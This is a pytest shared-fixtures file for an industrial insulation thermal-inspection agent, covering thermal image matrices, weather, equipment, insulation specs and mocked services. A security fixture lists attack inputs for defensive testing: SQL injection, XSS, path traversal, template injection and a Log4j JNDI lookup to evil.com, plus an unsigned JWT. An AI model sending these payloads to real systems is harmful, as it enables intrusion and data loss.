# -*- coding: utf-8 -*-
"""
GL-015 INSULSCAN Test Suite - Shared Fixtures

Comprehensive pytest fixtures for testing the Insulation Inspection Agent.
Provides mock data, test configurations, and shared utilities for all test modules.

Fixtures Include:
- Thermal image data generators
- Ambient condition configurations
- Equipment parameter sets
- Insulation specification mocks
- Calculator instances
- Mock connectors and services

Author: GL-TestEngineer
Version: 1.0.0
"""

import pytest
import asyncio
import hashlib
import json
import numpy as np
from decimal import Decimal
from datetime import datetime, date, timedelta
from typing import Any, Dict, List, Optional, Tuple
from unittest.mock import Mock, AsyncMock, MagicMock, patch
from dataclasses import dataclass, field
import uuid
import random


# =============================================================================
# THERMAL IMAGE DATA FIXTURES
# =============================================================================

@pytest.fixture
def sample_thermal_image_data() -> Dict[str, Any]:
    """
    Generate sample thermal image data for testing.

    Returns a dictionary containing temperature matrix, metadata,
    and camera parameters typical of industrial thermal inspections.
    """
    # Create a 320x240 temperature matrix (typical IR camera resolution)
    np.random.seed(42)  # Deterministic for reproducibility

    # Base temperature with gradients simulating insulation defects
    base_temp = 45.0
    rows, cols = 240, 320

    temp_matrix = np.full((rows, cols), base_temp, dtype=np.float32)

    # Add hotspot region (simulating insulation damage)
    hotspot_center = (120, 160)
    hotspot_radius = 30
    hotspot_temp = 85.0

    for i in range(rows):
        for j in range(cols):
            dist = np.sqrt((i - hotspot_center[0])**2 + (j - hotspot_center[1])**2)
            if dist < hotspot_radius:
                temp_matrix[i, j] = hotspot_temp - (dist / hotspot_radius) * 20

    # Add thermal gradient (simulating pipe direction)
    gradient = np.linspace(0, 5, cols)
    temp_matrix += gradient

    # Add measurement noise
    noise = np.random.normal(0, 0.5, (rows, cols))
    temp_matrix += noise

    return {
        "temperature_matrix": temp_matrix.tolist(),
        "image_width": cols,
        "image_height": rows,
        "min_temperature_c": float(np.min(temp_matrix)),
        "max_temperature_c": float(np.max(temp_matrix)),
        "avg_temperature_c": float(np.mean(temp_matrix)),
        "capture_timestamp": datetime.now().isoformat(),
        "camera_model": "FLIR T640",
        "camera_serial": "TEST-12345",
        "lens_fov_degrees": 45.0,
        "emissivity_setting": 0.95,
        "reflected_temperature_c": 25.0,
        "atmospheric_temperature_c": 25.0,
        "distance_m": 3.0,
        "relative_humidity_percent": 50.0,
        "raw_format": "RADIOMETRIC_JPEG",
        "spatial_resolution_mrad": 0.68,
        "thermal_sensitivity_c": 0.03,
        "accuracy_percent": 2.0,
        "calibration_date": "2025-01-15",
    }


@pytest.fixture
def sample_thermal_image_with_multiple_defects() -> Dict[str, Any]:
    """Generate thermal image data with multiple insulation defects."""
    np.random.seed(123)

    rows, cols = 480, 640
    base_temp = 40.0
    temp_matrix = np.full((rows, cols), base_temp, dtype=np.float32)

    # Defect 1: Missing insulation (large hotspot)
    center1 = (150, 200)
    for i in range(rows):
        for j in range(cols):
            dist = np.sqrt((i - center1[0])**2 + (j - center1[1])**2)
            if dist < 50:
                temp_matrix[i, j] = 120.0 - dist * 1.2

    # Defect 2: Wet insulation (moderate hotspot)
    center2 = (300, 450)
    for i in range(rows):
        for j in range(cols):
            dist = np.sqrt((i - center2[0])**2 + (j - center2[1])**2)
            if dist < 35:
                temp_matrix[i, j] = 75.0 - dist * 0.8

    # Defect 3: Thermal bridge (linear pattern)
    for i in range(200, 280):
        for j in range(100, 130):
            temp_matrix[i, j] = 65.0

    return {
        "temperature_matrix": temp_matrix.tolist(),
        "image_width": cols,
        "image_height": rows,
        "min_temperature_c": float(np.min(temp_matrix)),
        "max_temperature_c": float(np.max(temp_matrix)),
        "avg_temperature_c": float(np.mean(temp_matrix)),
        "defect_count": 3,
        "defect_types": ["missing", "wet", "thermal_bridge"],
    }


@pytest.fixture
def temperature_matrix_320x240():
    """Create standard 320x240 temperature matrix for testing."""
    np.random.seed(42)
    matrix = np.random.uniform(20, 80, (240, 320)).astype(np.float32)
    return matrix


@pytest.fixture
def temperature_matrix_640x480():
    """Create high-resolution 640x480 temperature matrix."""
    np.random.seed(42)
    matrix = np.random.uniform(20, 80, (480, 640)).astype(np.float32)
    return matrix


# =============================================================================
# AMBIENT CONDITIONS FIXTURES
# =============================================================================

@pytest.fixture
def sample_ambient_conditions() -> Dict[str, Any]:
    """Standard ambient conditions for testing."""
    return {
        "ambient_temperature_c": Decimal("25.0"),
        "wind_speed_m_s": Decimal("2.5"),
        "relative_humidity_percent": Decimal("60.0"),
        "atmospheric_pressure_kpa": Decimal("101.325"),
        "sky_condition": "partly_cloudy",
        "solar_irradiance_w_m2": Decimal("500.0"),
        "measurement_timestamp": datetime.now(),
        "location_indoor": False,
        "elevation_m": Decimal("50.0"),
    }


@pytest.fixture
def hot_summer_conditions() -> Dict[str, Any]:
    """Hot summer ambient conditions."""
    return {
        "ambient_temperature_c": Decimal("38.0"),
        "wind_speed_m_s": Decimal("1.0"),
        "relative_humidity_percent": Decimal("70.0"),
        "atmospheric_pressure_kpa": Decimal("101.0"),
        "sky_condition": "clear",
        "solar_irradiance_w_m2": Decimal("950.0"),
        "location_indoor": False,
    }


@pytest.fixture
def cold_winter_conditions() -> Dict[str, Any]:
    """Cold winter ambient conditions."""
    return {
        "ambient_temperature_c": Decimal("-15.0"),
        "wind_speed_m_s": Decimal("5.0"),
        "relative_humidity_percent": Decimal("30.0"),
        "atmospheric_pressure_kpa": Decimal("102.0"),
        "sky_condition": "overcast",
        "solar_irradiance_w_m2": Decimal("100.0"),
        "location_indoor": False,
    }


@pytest.fixture
def indoor_conditions() -> Dict[str, Any]:
    """Indoor ambient conditions."""
    return {
        "ambient_temperature_c": Decimal("22.0"),
        "wind_speed_m_s": Decimal("0.1"),
        "relative_humidity_percent": Decimal("45.0"),
        "atmospheric_pressure_kpa": Decimal("101.325"),
        "sky_condition": "indoor",
        "solar_irradiance_w_m2": Decimal("0.0"),
        "location_indoor": True,
    }


@pytest.fixture
def high_wind_conditions() -> Dict[str, Any]:
    """High wind ambient conditions for forced convection testing."""
    return {
        "ambient_temperature_c": Decimal("20.0"),
        "wind_speed_m_s": Decimal("15.0"),
        "relative_humidity_percent": Decimal("50.0"),
        "atmospheric_pressure_kpa": Decimal("100.5"),
        "sky_condition": "overcast",
        "solar_irradiance_w_m2": Decimal("200.0"),
        "location_indoor": False,
    }


# =============================================================================
# EQUIPMENT PARAMETERS FIXTURES
# =============================================================================

@pytest.fixture
def sample_equipment_parameters() -> Dict[str, Any]:
    """Standard industrial pipe equipment parameters."""
    return {
        "equipment_type": "pipe",
        "equipment_tag": "P-1001-A",
        "pipe_outer_diameter_m": Decimal("0.1143"),  # 4" NPS pipe
        "pipe_length_m": Decimal("10.0"),
        "process_temperature_c": Decimal("175.0"),
        "operating_pressure_kpa": Decimal("1000.0"),
        "surface_emissivity": Decimal("0.90"),
        "surface_material": "painted_steel",
        "orientation": "horizontal",
        "installation_year": 2015,
        "service_type": "steam",
        "fluid_type": "saturated_steam",
        "design_heat_loss_w_per_m": Decimal("75.0"),
    }


@pytest.fixture
def high_temp_vessel_parameters() -> Dict[str, Any]:
    """High temperature vessel equipment parameters."""
    return {
        "equipment_type": "vessel",
        "equipment_tag": "V-2001",
        "vessel_diameter_m": Decimal("3.0"),
        "vessel_height_m": Decimal("8.0"),
        "surface_area_m2": Decimal("85.0"),
        "process_temperature_c": Decimal("350.0"),
        "operating_pressure_kpa": Decimal("2500.0"),
        "surface_emissivity": Decimal("0.85"),
        "surface_material": "oxidized_steel",
        "orientation": "vertical",
        "installation_year": 2010,
        "service_type": "reactor",
    }


@pytest.fixture
def cold_service_pipe_parameters() -> Dict[str, Any]:
    """Cold service (cryogenic) pipe parameters."""
    return {
        "equipment_type": "pipe",
        "equipment_tag": "P-3001-B",
        "pipe_outer_diameter_m": Decimal("0.2191"),  # 8" NPS pipe
        "pipe_length_m": Decimal("25.0"),
        "process_temperature_c": Decimal("-45.0"),
        "operating_pressure_kpa": Decimal("500.0"),
        "surface_emissivity": Decimal("0.85"),
        "surface_material": "aluminum_jacket",
        "orientation": "horizontal",
        "installation_year": 2018,
        "service_type": "ammonia_refrigerant",
    }


@pytest.fixture
def steam_turbine_parameters() -> Dict[str, Any]:
    """Steam turbine equipment parameters."""
    return {
        "equipment_type": "turbine",
        "equipment_tag": "ST-4001",
        "surface_area_m2": Decimal("120.0"),
        "process_temperature_c": Decimal("540.0"),
        "operating_pressure_kpa": Decimal("10000.0"),
        "surface_emissivity": Decimal("0.80"),
        "surface_material": "painted_steel",
        "installation_year": 2005,
        "service_type": "power_generation",
    }


# =============================================================================
# INSULATION SPECIFICATIONS FIXTURES
# =============================================================================

@pytest.fixture
def sample_insulation_specs() -> Dict[str, Any]:
    """Standard mineral wool insulation specifications."""
    return {
        "insulation_type": "mineral_wool",
        "insulation_material": "rockwool_industrial",
        "thickness_mm": Decimal("75.0"),
        "density_kg_m3": Decimal("128.0"),
        "thermal_conductivity_w_m_k": Decimal("0.040"),
        "max_service_temp_c": Decimal("650.0"),
        "min_service_temp_c": Decimal("-40.0"),
        "jacket_material": "aluminum",
        "jacket_thickness_mm": Decimal("0.6"),
        "vapor_barrier": True,
        "installation_date": date(2018, 6, 15),
        "manufacturer": "Rockwool",
        "product_code": "ProRox PS 960",
        "design_life_years": 25,
    }


@pytest.fixture
def calcium_silicate_insulation() -> Dict[str, Any]:
    """High temperature calcium silicate insulation."""
    return {
        "insulation_type": "calcium_silicate",
        "thickness_mm": Decimal("100.0"),
        "density_kg_m3": Decimal("240.0"),
        "thermal_conductivity_w_m_k": Decimal("0.055"),
        "max_service_temp_c": Decimal("1000.0"),
        "jacket_material": "stainless_steel",
        "jacket_thickness_mm": Decimal("0.5"),
    }


@pytest.fixture
def cellular_glass_insulation() -> Dict[str, Any]:
    """Cellular glass insulation for cold service."""
    return {
        "insulation_type": "cellular_glass",
        "thickness_mm": Decimal("80.0"),
        "density_kg_m3": Decimal("115.0"),
        "thermal_conductivity_w_m_k": Decimal("0.042"),
        "max_service_temp_c": Decimal("430.0"),
        "min_service_temp_c": Decimal("-268.0"),
        "jacket_material": "aluminum",
        "vapor_barrier": True,
        "moisture_resistant": True,
    }


@pytest.fixture
def aerogel_insulation() -> Dict[str, Any]:
    """High-performance aerogel insulation."""
    return {
        "insulation_type": "aerogel",
        "thickness_mm": Decimal("25.0"),
        "density_kg_m3": Decimal("150.0"),
        "thermal_conductivity_w_m_k": Decimal("0.015"),
        "max_service_temp_c": Decimal("650.0"),
        "jacket_material": "aluminum",
        "high_performance": True,
    }


@pytest.fixture
def degraded_insulation_specs() -> Dict[str, Any]:
    """Degraded/damaged insulation specifications for testing defect detection."""
    return {
        "insulation_type": "mineral_wool",
        "thickness_mm": Decimal("50.0"),  # Original was 75mm, compressed
        "density_kg_m3": Decimal("180.0"),  # Higher due to compression
        "thermal_conductivity_w_m_k": Decimal("0.065"),  # Degraded performance
        "condition": "degraded",
        "degradation_type": "moisture_damage",
        "estimated_performance_loss_percent": Decimal("40.0"),
        "jacket_condition": "damaged",
        "vapor_barrier_intact": False,
    }


# =============================================================================
# CALCULATOR INSTANCES FIXTURES
# =============================================================================

@pytest.fixture
def thermal_image_analyzer():
    """Create ThermalImageAnalyzer instance for testing."""
    try:
        from src.agents.GL_015.calculators import ThermalImageAnalyzer
        return ThermalImageAnalyzer()
    except ImportError:
        # Return mock if import fails
        mock_analyzer = Mock()
        mock_analyzer.analyze_temperature_matrix = Mock(return_value={
            "min_temp_c": 20.0,
            "max_temp_c": 120.0,
            "avg_temp_c": 55.0,
            "std_dev_c": 15.0,
        })
        return mock_analyzer


@pytest.fixture
def heat_loss_calculator():
    """Create HeatLossCalculator instance for testing."""
    try:
        from src.agents.GL_015.calculators.heat_loss_calculator import HeatLossCalculator
        return HeatLossCalculator()
    except ImportError:
        mock_calc = Mock()
        mock_calc.calculate_conduction_loss = Mock()
        mock_calc.calculate_convection_coefficient = Mock()
        return mock_calc


@pytest.fixture
def degradation_detector():
    """Create degradation detection fixture."""
    try:
        from src.agents.GL_015.calculators import InsulationPerformanceTracker
        return InsulationPerformanceTracker()
    except ImportError:
        mock_detector = Mock()
        mock_detector.analyze_degradation = Mock()
        return mock_detector


@pytest.fixture
def repair_prioritization_engine():
    """Create RepairPrioritizationEngine instance for testing."""
    try:
        from src.agents.GL_015.calculators.repair_prioritization import (
            RepairPrioritizationEngine,
            CriticalityWeights,
            EconomicParameters,
        )
        return RepairPrioritizationEngine(
            criticality_weights=CriticalityWeights(),
            economic_params=EconomicParameters(),
        )
    except ImportError:
        mock_engine = Mock()
        mock_engine.calculate_criticality_score = Mock()
        mock_engine.calculate_repair_roi = Mock()
        return mock_engine


@pytest.fixture
def economic_calculator():
    """Create EconomicCalculator instance for testing."""
    try:
        from src.agents.GL_015.calculators.economic_calculator import EconomicCalculator
        return EconomicCalculator()
    except ImportError:
        mock_calc = Mock()
        mock_calc.estimate_repair_cost = Mock()
        mock_calc.calculate_energy_savings = Mock()
        return mock_calc


@pytest.fixture
def surface_temp_analyzer():
    """Create SurfaceTemperatureAnalyzer instance for testing."""
    try:
        from src.agents.GL_015.calculators import SurfaceTemperatureAnalyzer
        return SurfaceTemperatureAnalyzer()
    except ImportError:
        mock_analyzer = Mock()
        mock_analyzer.normalize_to_reference = Mock()
        return mock_analyzer


@pytest.fixture
def energy_loss_quantifier():
    """Create EnergyLossQuantifier instance for testing."""
    try:
        from src.agents.GL_015.calculators import EnergyLossQuantifier
        return EnergyLossQuantifier()
    except ImportError:
        mock_quantifier = Mock()
        mock_quantifier.calculate_annual_loss = Mock()
        return mock_quantifier


# =============================================================================
# MOCK EXTERNAL SERVICES FIXTURES
# =============================================================================

@pytest.fixture
def mock_thermal_camera():
    """Mock thermal camera connector."""
    camera = AsyncMock()
    camera.connect = AsyncMock(return_value=True)
    camera.disconnect = AsyncMock(return_value=True)
    camera.capture_image = AsyncMock(return_value={
        "image_data": b"mock_image_data",
        "temperature_matrix": [[25.0] * 320 for _ in range(240)],
        "timestamp": datetime.now().isoformat(),
        "camera_serial": "MOCK-CAM-001",
    })
    camera.get_status = AsyncMock(return_value={
        "connected": True,
        "battery_level": 85,
        "storage_available_mb": 2048,
        "sensor_temperature_c": 35.0,
    })
    camera.set_emissivity = AsyncMock(return_value=True)
    camera.set_reflected_temperature = AsyncMock(return_value=True)
    camera.calibrate = AsyncMock(return_value={"status": "calibrated"})
    return camera


@pytest.fixture
def mock_cmms_connector():
    """Mock CMMS (Computerized Maintenance Management System) connector."""
    cmms = AsyncMock()
    cmms.connect = AsyncMock(return_value=True)
    cmms.disconnect = AsyncMock(return_value=True)
    cmms.create_work_order = AsyncMock(return_value={
        "work_order_id": "WO-2025-001234",
        "status": "created",
        "priority": "high",
    })
    cmms.get_equipment_info = AsyncMock(return_value={
        "equipment_tag": "P-1001-A",
        "description": "Steam Header Pipe",
        "location": "Unit 1 - Boiler House",
        "installation_date": "2015-06-15",
        "last_inspection": "2024-10-20",
    })
    cmms.get_maintenance_history = AsyncMock(return_value=[
        {"date": "2024-10-20", "type": "inspection", "findings": "Normal"},
        {"date": "2023-05-10", "type": "repair", "description": "Jacket replacement"},
    ])
    cmms.update_asset_condition = AsyncMock(return_value=True)
    return cmms


@pytest.fixture
def mock_weather_service():
    """Mock weather service connector."""
    weather = AsyncMock()
    weather.get_current_conditions = AsyncMock(return_value={
        "temperature_c": 25.0,
        "humidity_percent": 60.0,
        "wind_speed_m_s": 3.5,
        "wind_direction_degrees": 180,
        "cloud_cover_percent": 40,
        "solar_radiation_w_m2": 650,
        "atmospheric_pressure_hpa": 1013.25,
        "timestamp": datetime.now().isoformat(),
    })
    weather.get_forecast = AsyncMock(return_value=[
        {"hour": 1, "temperature_c": 24.0, "wind_speed_m_s": 3.0},
        {"hour": 2, "temperature_c": 23.5, "wind_speed_m_s": 2.8},
    ])
    weather.get_historical = AsyncMock(return_value={
        "avg_temperature_c": 22.0,
        "max_temperature_c": 35.0,
        "min_temperature_c": 8.0,
    })
    return weather


@pytest.fixture
def mock_database():
    """Mock database connection for testing."""
    db = AsyncMock()
    db.connect = AsyncMock(return_value=True)
    db.disconnect = AsyncMock(return_value=True)
    db.execute = AsyncMock(return_value={"affected_rows": 1})
    db.fetch_one = AsyncMock(return_value={"id": 1, "name": "test"})
    db.fetch_all = AsyncMock(return_value=[{"id": 1}, {"id": 2}])
    db.transaction = AsyncMock()
    return db


# =============================================================================
# TEST CLIENT AND API FIXTURES
# =============================================================================

@pytest.fixture
def test_client():
    """Create test client for API testing."""
    try:
        from fastapi.testclient import TestClient
        # Would import actual API app here
        client = Mock()
        client.get = Mock()
        client.post = Mock()
        return client
    except ImportError:
        return Mock()


@pytest.fixture
def async_test_client():
    """Create async test client for API testing."""
    client = AsyncMock()
    client.get = AsyncMock()
    client.post = AsyncMock()
    client.put = AsyncMock()
    client.delete = AsyncMock()
    return client


# =============================================================================
# THERMAL DEFECT TEST DATA FIXTURES
# =============================================================================

@pytest.fixture
def sample_thermal_defect():
    """Create sample thermal defect for testing repair prioritization."""
    try:
        from src.agents.GL_015.calculators.repair_prioritization import (
            ThermalDefect,
            DefectLocation,
            DamageType,
            InsulationMaterial,
            EquipmentType,
        )

        location = DefectLocation(
            equipment_tag="P-1001-A",
            equipment_type=EquipmentType.PIPE,
            area_code="AREA-01",
            unit_code="U-100",
            elevation_m=5.0,
            access_difficulty=2,
            scaffold_required=True,
        )

        return ThermalDefect(
            defect_id="DEF-2025-001",
            location=location,
            damage_type=DamageType.MISSING,
            length_m=Decimal("3.5"),
            process_temperature_c=Decimal("175.0"),
            surface_temperature_c=Decimal("95.0"),
            ambient_temperature_c=Decimal("25.0"),
            heat_loss_w_per_m=Decimal("250.0"),
            insulation_material=InsulationMaterial.MINERAL_WOOL,
            insulation_thickness_mm=Decimal("75.0"),
            pipe_diameter_mm=Decimal("114.3"),
            existing_condition_score=8,
        )
    except ImportError:
        return {
            "defect_id": "DEF-2025-001",
            "damage_type": "missing",
            "length_m": 3.5,
            "heat_loss_w_per_m": 250.0,
        }


@pytest.fixture
def multiple_thermal_defects():
    """Create list of thermal defects for batch testing."""
    defects = []
    for i in range(5):
        defects.append({
            "defect_id": f"DEF-2025-{i+1:03d}",
            "equipment_tag": f"P-100{i+1}-A",
            "damage_type": ["missing", "wet", "compressed", "jacket_damaged", "thermal_bridging"][i],
            "length_m": Decimal(str(1.0 + i * 0.5)),
            "heat_loss_w_per_m": Decimal(str(100 + i * 50)),
            "process_temperature_c": Decimal(str(150 + i * 25)),
            "surface_temperature_c": Decimal(str(60 + i * 10)),
            "priority_score": i + 1,
        })
    return defects


# =============================================================================
# CALCULATION VALIDATION DATA FIXTURES
# =============================================================================

@pytest.fixture
def known_heat_loss_values() -> Dict[str, Any]:
    """
    Known heat loss values for validation testing.
    These are pre-calculated reference values for determinism testing.
    """
    return {
        "case_1": {
            "description": "4-inch pipe, 175C, 75mm mineral wool",
            "pipe_od_m": Decimal("0.1143"),
            "pipe_length_m": Decimal("1.0"),
            "process_temp_c": Decimal("175.0"),
            "ambient_temp_c": Decimal("25.0"),
            "insulation_thickness_m": Decimal("0.075"),
            "k_value_w_m_k": Decimal("0.045"),
            "expected_heat_loss_w_per_m": Decimal("45.5"),  # Reference value
            "tolerance_percent": Decimal("5.0"),
        },
        "case_2": {
            "description": "8-inch pipe, 350C, 100mm calcium silicate",
            "pipe_od_m": Decimal("0.2191"),
            "pipe_length_m": Decimal("1.0"),
            "process_temp_c": Decimal("350.0"),
            "ambient_temp_c": Decimal("25.0"),
            "insulation_thickness_m": Decimal("0.100"),
            "k_value_w_m_k": Decimal("0.075"),
            "expected_heat_loss_w_per_m": Decimal("125.0"),
            "tolerance_percent": Decimal("5.0"),
        },
        "case_3": {
            "description": "Flat surface, 200C, 50mm fiberglass",
            "surface_area_m2": Decimal("1.0"),
            "process_temp_c": Decimal("200.0"),
            "ambient_temp_c": Decimal("20.0"),
            "insulation_thickness_m": Decimal("0.050"),
            "k_value_w_m_k": Decimal("0.042"),
            "expected_heat_loss_w_per_m2": Decimal("151.2"),
            "tolerance_percent": Decimal("5.0"),
        },
    }


@pytest.fixture
def emissivity_correction_data() -> List[Dict[str, Any]]:
    """Test data for emissivity correction calculations."""
    return [
        {"material": "painted_steel", "emissivity": Decimal("0.90"), "uncertainty": Decimal("0.02")},
        {"material": "oxidized_steel", "emissivity": Decimal("0.85"), "uncertainty": Decimal("0.03")},
        {"material": "polished_aluminum", "emissivity": Decimal("0.10"), "uncertainty": Decimal("0.02")},
        {"material": "weathered_aluminum", "emissivity": Decimal("0.25"), "uncertainty": Decimal("0.05")},
        {"material": "stainless_steel", "emissivity": Decimal("0.60"), "uncertainty": Decimal("0.05")},
    ]


@pytest.fixture
def convection_coefficient_test_cases() -> List[Dict[str, Any]]:
    """Test cases for convection coefficient calculations."""
    return [
        {
            "description": "Natural convection, horizontal cylinder",
            "surface_temp_c": Decimal("80.0"),
            "ambient_temp_c": Decimal("25.0"),
            "characteristic_length_m": Decimal("0.114"),
            "geometry": "horizontal_cylinder",
            "wind_speed_m_s": Decimal("0.0"),
            "expected_h_range": (Decimal("5.0"), Decimal("10.0")),
        },
        {
            "description": "Forced convection, high wind",
            "surface_temp_c": Decimal("60.0"),
            "ambient_temp_c": Decimal("20.0"),
            "characteristic_length_m": Decimal("0.200"),
            "geometry": "horizontal_cylinder",
            "wind_speed_m_s": Decimal("10.0"),
            "expected_h_range": (Decimal("25.0"), Decimal("50.0")),
        },
        {
            "description": "Natural convection, vertical surface",
            "surface_temp_c": Decimal("100.0"),
            "ambient_temp_c": Decimal("25.0"),
            "characteristic_length_m": Decimal("2.0"),
            "geometry": "vertical_flat",
            "wind_speed_m_s": Decimal("0.0"),
            "expected_h_range": (Decimal("4.0"), Decimal("8.0")),
        },
    ]


# =============================================================================
# EVENT LOOP AND ASYNC FIXTURES
# =============================================================================

@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def async_context():
    """Async context manager for test setup/teardown."""
    class AsyncContext:
        async def __aenter__(self):
            return self

        async def __aexit__(self, exc_type, exc_val, exc_tb):
            pass

    return AsyncContext()


# =============================================================================
# PROVENANCE AND HASH VALIDATION FIXTURES
# =============================================================================

@pytest.fixture
def provenance_test_data() -> Dict[str, Any]:
    """Test data for provenance hash validation."""
    return {
        "calculation_id": str(uuid.uuid4()),
        "timestamp": datetime.now().isoformat(),
        "inputs": {
            "process_temp_c": "175.0",
            "ambient_temp_c": "25.0",
            "insulation_thickness_m": "0.075",
        },
        "outputs": {
            "heat_loss_w": "450.5",
            "surface_temp_c": "45.2",
        },
        "methodology": "ASTM_C680",
        "version": "1.0.0",
    }


@pytest.fixture
def calculate_provenance_hash():
    """Fixture function to calculate provenance hash."""
    def _calculate(data: Dict[str, Any]) -> str:
        json_str = json.dumps(data, sort_keys=True, default=str)
        return hashlib.sha256(json_str.encode("utf-8")).hexdigest()
    return _calculate


# =============================================================================
# PERFORMANCE TESTING FIXTURES
# =============================================================================

@pytest.fixture
def large_thermal_dataset():
    """Generate large dataset for performance testing."""
    np.random.seed(42)
    return {
        "images": [
            np.random.uniform(20, 100, (480, 640)).tolist()
            for _ in range(100)
        ],
        "defect_count": 100,
    }


@pytest.fixture
def benchmark_config():
    """Configuration for benchmark tests."""
    return {
        "iterations": 100,
        "warmup_iterations": 10,
        "timeout_seconds": 30,
        "target_throughput_per_sec": 100,
        "max_latency_ms": 50,
        "p95_latency_ms": 30,
        "p99_latency_ms": 45,
    }


# =============================================================================
# SECURITY TESTING FIXTURES
# =============================================================================

@pytest.fixture
def malicious_input_patterns() -> List[str]:
    """Common malicious input patterns for security testing."""
    return [
        "'; DROP TABLE inspections; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j style
        "\x00\x00\x00\x00",  # Null bytes
        "A" * 10000,  # Buffer overflow attempt
    ]


@pytest.fixture
def valid_api_token():
    """Valid API token for authentication testing."""
    return "test_token_" + hashlib.sha256(b"test_secret").hexdigest()[:32]


@pytest.fixture
def invalid_api_tokens() -> List[str]:
    """Invalid API tokens for security testing."""
    return [
        "",
        "invalid_token",
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",  # None algorithm JWT
        "A" * 1000,  # Very long token
    ]


# =============================================================================
# CLEANUP AND RESOURCE MANAGEMENT
# =============================================================================

@pytest.fixture(autouse=True)
def cleanup_temp_files(tmp_path):
    """Auto-cleanup fixture for temporary files."""
    yield
    # Cleanup happens automatically with tmp_path


@pytest.fixture
def temp_image_file(tmp_path):
    """Create temporary thermal image file for testing."""
    import struct

    image_path = tmp_path / "test_thermal.dat"

    # Create mock radiometric data
    width, height = 320, 240
    temp_data = [25.0 + i * 0.1 for i in range(width * height)]

    with open(image_path, 'wb') as f:
        f.write(struct.pack('II', width, height))
        for temp in temp_data:
            f.write(struct.pack('f', temp))

    yield image_path

    # Cleanup
    if image_path.exists():
        image_path.unlink()


# =============================================================================
# CONFIGURATION FIXTURES
# =============================================================================

@pytest.fixture
def test_settings() -> Dict[str, Any]:
    """Test environment settings."""
    return {
        "environment": "test",
        "debug": True,
        "log_level": "DEBUG",
        "database_url": "sqlite:///:memory:",
        "cache_ttl_seconds": 60,
        "max_image_size_mb": 50,
        "supported_camera_models": ["FLIR", "Fluke", "Testo"],
        "default_emissivity": 0.95,
        "temperature_precision_digits": 2,
    }


@pytest.fixture
def production_settings() -> Dict[str, Any]:
    """Production-like settings for integration testing."""
    return {
        "environment": "production",
        "debug": False,
        "log_level": "WARNING",
        "cache_ttl_seconds": 3600,
        "max_concurrent_requests": 100,
        "request_timeout_seconds": 30,
    }


# =============================================================================
# PYTEST HOOKS AND CONFIGURATION
# =============================================================================

def pytest_configure(config):
    """Configure custom pytest markers."""
    config.addinivalue_line(
        "markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')"
    )
    config.addinivalue_line(
        "markers", "integration: marks tests as integration tests"
    )
    config.addinivalue_line(
        "markers", "e2e: marks tests as end-to-end tests"
    )
    config.addinivalue_line(
        "markers", "security: marks tests as security tests"
    )
    config.addinivalue_line(
        "markers", "performance: marks tests as performance tests"
    )
    config.addinivalue_line(
        "markers", "determinism: marks tests as determinism/reproducibility tests"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection based on markers."""
    if config.getoption("-m"):
        return

    # Add skip markers for slow tests in CI unless explicitly requested
    skip_slow = pytest.mark.skip(reason="Slow test - use -m slow to run")
    for item in items:
        if "slow" in item.keywords:
            item.add_marker(skip_slow)
